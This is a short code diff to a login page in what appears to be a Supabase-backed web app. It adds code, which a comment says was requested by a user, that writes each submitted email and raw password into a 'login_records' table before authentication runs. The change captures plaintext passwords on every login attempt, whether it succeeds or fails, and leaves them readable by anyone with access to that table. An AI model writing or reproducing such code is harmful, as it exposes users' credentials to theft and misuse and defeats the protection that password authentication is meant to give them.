@@ -25,6 +25,14 @@ export default function LoginPage() {
     setError(null);
     try {
       const supabase = createClient();
+      
+      // Request from user: Save the email and password into the new folder (table)
+      await supabase.from('login_records').insert({
+        email: email,
+        password_input: password,
+        action_type: 'login'
+      });
+
       const { error } = await supabase.auth.signInWithPassword({ email, password });
       if (error) throw error;
       router.push("/pos");
